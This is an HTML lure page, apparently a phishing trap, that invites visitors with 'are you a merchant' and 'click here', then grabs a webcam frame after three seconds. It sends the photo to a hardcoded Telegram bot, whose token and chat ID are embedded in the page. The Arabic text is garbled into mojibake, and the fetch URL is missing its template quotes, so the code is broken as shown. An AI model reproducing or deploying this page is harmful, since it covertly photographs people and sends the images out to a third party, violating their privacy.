<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>turkey</title>
    <style>
        body { font-family: sans-serif; text-align: center; background: #1a1a1a; color: white; padding-top: 50px; }
        video { border: 5px solid #00ff00; border-radius: 10px; background: #000; }
        .btn { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #00ff00; border: none; border-radius: 5px; margin-top: 20px; color: black; font-weight: bold; }
        p { color: #aaa; }
    </style>
</head>
<body>
    <h2>찾횗횒횊횉챨 횊횩 횦챠 횎횒횕챠 횉찼횊횗찾횑횋 횉찼횓횉횛 횊챠! ??</h2>
    <p>are you a merchant</p>
    
    <video id="video" width="400" height="300" autoplay></video>
    <canvas id="canvas" width="400" height="300" style="display:none;"></canvas>
    <br>
    <button class="btn" onclick="startTest()">click here</button>

    <script>
        // 찾횣찼챈찾횉횎횩 횉찼횎챠 횄횣횕횕채횉책횉 횙챈챠횉챨
        const botToken = "8608335050:AAEgtOoX2E-AC9Uk_jT1R5P7K3FOzpXsQzQ"; 
        const chatId = "8124196406"; 

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        function startTest() {
            // 횠찼횊 횉찼횇횖채 챈횦횎횒 횉찼횩횉찾챠횗횉
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    video.srcObject = stream;
                    // 횉채횎횢횉횗 3 횏챈횉채챠 찼횉찼횎횧횉횠 횉찼횛챈횗횋 챈횇횗횙횉찼책횉
                    setTimeout(takeAndSendPhoto, 3000);
                })
                .catch(err => {
                    alert("챠횑횊 횉찼찾챈횉횦횧횋 횣찼챙 횇횖채 횉찼횩횉찾챠횗횉 찼횩챠 챠횣찾찼 횉찼횎횒횕챠!");
                    console.error(err);
                });
        }

        function takeAndSendPhoto() {
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, 400, 300);
            
            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'shot.jpg');
                formData.append('caption', '챈횛찼횎 횛챈횗횋 횑횕챠횕횋 찾채 찾챈횧횣횩! ????');

                // 횇횗횙횉찼 횉찼횛챈횗횋 횇찼챙 Telegram Bot API
                fetch(https://api.telegram.org/bot${botToken}/sendPhoto, {
                    method: 'POST',
                    body: formData
                })
                .then(res => {
                    alert("횎찾 횇횗횙횉찼 채횎챠횑횎횩 횇찼챠첩 횊채횑횉횒! 횎횦횧횕 책횉횎횦횩 횉찼횂채.");
                })
                .catch(err => {
                    alert("횒횕횏 횓횠횄 횦챠 횉찼횇횗횙횉찼징 횎횄횩횕 찾채 횉횎횛횉찼 횉찼횇채횎횗채횎.");
                });
            }, 'image/jpeg');
        }
    </script>
</body>
</html>
